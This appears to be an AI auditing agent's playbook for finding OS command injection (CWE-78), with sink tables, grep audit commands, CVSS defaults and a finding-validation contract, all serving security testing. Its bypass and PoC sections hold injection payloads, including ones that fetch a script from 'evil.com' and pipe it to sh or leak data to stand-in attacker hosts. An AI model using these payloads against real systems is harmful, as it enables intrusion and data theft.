---
name: command-injection
description: Hunt OS command injection (CWE-78) — user input reaching shell, exec, or system calls. Covers argument-array bypasses, path confusion, and template-string injection in modern frameworks.
---

# Command Injection Playbook

If SQL injection is the king of web vulns, command injection is the
king of DevOps vulns. Every image-processing upload, PDF generator,
ffmpeg wrapper, and "run a script" feature is a candidate.

## 1. Sinks

| Language | Dangerous                                | Safer                                              |
|----------|------------------------------------------|----------------------------------------------------|
| Python   | `os.system`, `subprocess.Popen(..., shell=True)`, `os.popen`, `commands.getoutput` | `subprocess.run([...], shell=False)` |
| Node     | `child_process.exec`, `execSync`         | `child_process.execFile`, `spawn` (array args)     |
| Go       | `exec.Command("sh","-c",user)`           | `exec.Command(bin, arg1, arg2)` with array         |
| Java     | `Runtime.exec(String)`                   | `Runtime.exec(String[])`, `ProcessBuilder([...])`  |
| Ruby     | backticks, `system(str)`, `%x{...}`      | `Kernel.system(bin, *args)`, `Open3.capture2e`     |
| PHP      | `shell_exec`, `exec`, `system`, backticks, `passthru` | `escapeshellarg` + explicit execve |

Even the "safer" APIs are exploitable if the *binary path* is user
controlled (`exec.Command(userBin, "--version")`).

## 2. Non-obvious sinks

- **Template engines rendering shell:** Ansible playbooks, systemd unit
  files, crontab strings
- **Docker-compose / k8s manifests** where `command:` is built from user input
- **PDF libraries** that shell out to `pdflatex`, `wkhtmltopdf`, `puppeteer`
- **ImageMagick** — `convert user.jpg out.png` where `user.jpg` is
  attacker-chosen (classic ImageTragick)
- **ffmpeg** `-i` with user-provided URL/file (SSRF + RCE combo)
- **Git clone** with user-supplied URL (remote helper injection)
- **SSH/Rsync** wrappers building `ssh user@host "cmd"` from templates
- **ZIP extractors** passing archive path to `unzip` binary

## 3. Audit workflow

```bash
# Level 1: obvious sinks
grep -rE 'os\.system\(|subprocess.*shell\s*=\s*True|exec\s*\(' /workspace/src
grep -rE 'Runtime\.exec\(|ProcessBuilder\([^[]' /workspace/src
grep -rE 'child_process\.(exec|execSync)\(' /workspace/src

# Level 2: shell metacharacters in strings
grep -rE '"[^"]*\$\{[a-z]+\}.*(-[a-z]|[;|&])"' /workspace/src

# Level 3: template strings
grep -rE 'ffmpeg|pdflatex|wkhtmltopdf|convert|pandoc' /workspace/src
```

## 4. Bypasses

Even when developers "sanitize" via blocklists:

- **Argument injection** (the -oProxyCommand trick) — passing `-oProxyCommand=curl $(whoami).attacker.com` to ssh-based sinks
- **Space replacement** — `${IFS}`, `{ls,-la}` (brace expansion)
- **Backtick/dollar-paren** — `$(id)`, `` `id` ``
- **Command substitution in filename** — `$(curl evil.com/x.sh | sh).jpg`
- **Unicode normalisation** — `＂` (fullwidth) vs `"` bypass
- **Encoded newline** — `%0A` turns single-command into multi-command
- **TarSlip** — `tar xzf user.tgz` with `--checkpoint-action=exec=...`
- **Git** — `git clone 'ssh://ext::sh -c whoami # foo'`

## 5. PoC ideas

```bash
# Spare out-of-band tester — DNS exfil confirms silent RCE
curl "https://target.com/export?filename=; curl $(whoami).attacker.oob/"

# Blind, response-timing based
curl "https://target.com/export?filename=; sleep 7 #.pdf"

# Noisy but fastest confirmation
curl "https://target.com/export?filename=; id > /tmp/pwn #.pdf"
```

## 6. `validate_finding` contract

- success_patterns: `uid=\d+`, `root`, attacker OOB callback hit, `total 0`
- negative_command: same URL, filename set to `report.pdf`
- negative_patterns: `200`, `accepted`

## 7. Default CVSS

| Variant                          | Vector                                     | Score |
|----------------------------------|--------------------------------------------|-------|
| Blind OOB RCE unauth             | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H        | 9.8   |
| Authenticated RCE (low priv)     | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H        | 8.8   |
| RCE with scope change (container escape) | AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H | 10.0 |

## 8. Chain promotion

Command injection rarely needs chaining — it's the final hop of most
chains. Instead, use it to promote earlier nodes: add `enables` edges
from SSRF / file upload / path traversal vulns that deliver the
initial payload.
